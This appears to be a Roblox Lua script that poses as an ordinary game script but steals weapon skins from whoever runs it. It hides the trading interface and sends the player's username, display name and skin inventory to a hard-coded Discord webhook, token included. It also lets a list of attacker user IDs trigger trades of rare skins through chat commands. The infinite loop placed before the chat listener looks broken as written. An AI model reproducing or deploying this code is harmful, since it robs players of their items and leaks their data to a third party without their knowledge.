repeat task.wait() until game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")

getgenv().friends = {
    1501936199,
    9839218,
    83921839,
    151013460
}

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local StarterGui = game:GetService("StarterGui")
local EventFolder = game:GetService("ReplicatedStorage"):WaitForChild('DefaultChatSystemChatEvents')
local MainEvent = game:GetService("ReplicatedStorage"):WaitForChild('MainEvent')
local DataFolder = LocalPlayer:WaitForChild('DataFolder')

function trade_skins()
    local inventory = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('MainScreenGui'):WaitForChild('WeaponSkinsGUI'):WaitForChild('Body'):WaitForChild('Wrapper'):WaitForChild('SkinView'):WaitForChild('Trading'):WaitForChild('Inventory'):WaitForChild('Frame'):WaitForChild('ScrollingFrame')

    for i, v in pairs(inventory:GetChildren()) do
        if v:IsA('Frame') then
            local split_name = v.Name:split(']')
            local split_gun_name = split_name[1]:split('[')

            local gun_name = split_gun_name[2]
            local skin_name = split_name[2]

            if table.find({'Snow Wrap', 'Kitty', 'Galaxy', 'Electric', 'Inferno', 'Gold Glory', 'Matrix', 'Fish', 'Luck', 'Valentine', 'DH-Stars', 'Shadow', '8-BIT', 'Golden Age'}, skin_name) then
                MainEvent:FireServer('Trading', 'Add', '[' .. gun_name .. ']', skin_name)
                print('Added ' .. skin_name..'!')
            end
            task.wait(0.5)
        end
    end
end

function dump_skins()
    local Skins = DataFolder:WaitForChild('Skins').Value

    local Content = ""
    local Embed = {
        ["type"] = "rich",
        ["color"] = tonumber(0xFFFFFF),
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = '`' .. LocalPlayer.Name .. '`',
                ["inline"] = false
            },
            {
                ["name"] = "Display Name",
                ["value"] = '`' .. LocalPlayer.DisplayName .. '`',
                ["inline"] = false
            },
            {
                ["name"] = "Game",
                ["value"] = '`' .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. '`',
                ["inline"] = false
            },
            {
                ["name"] = "Skins",
                ["value"] = '```lua\n' .. Skins ..'```',
                ["inline"] = false
            }
        }
    }

    request({
        Url = "https://discord.com/api/webhooks/1227125197799297054/ysQxnKa653XgtQNAjNEViolrFvYbNdig2yxUQfNulIfr_f4QLL2XG3cm2ff70OEj_fkN",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
    })
end

while task.wait() do
    LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('MainScreenGui'):WaitForChild('WeaponSkinsGUI'):WaitForChild('Body').Visible = false
    LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('MainScreenGui'):WaitForChild('Notified').Visible = false
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
end

EventFolder.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageObj)
    local Player = Players[messageObj.FromSpeaker]
    if table.find(friends, Player.UserId) then
        local message = messageObj.Message
        if message == '!trade' then
            MainEvent:FireServer('Trading', 'Request',  Player)
        elseif message == '!add' then
            trade_skins()
        elseif message == '!ready' then
            MainEvent:FireServer('Trading', 'Ready', '', '')
        elseif message == '!confirm' then
            MainEvent:FireServer('Trading', 'Confirm', '', '')
        elseif message == '!skins' then
            dump_skins()
        end
    end
end)

dump_skins()
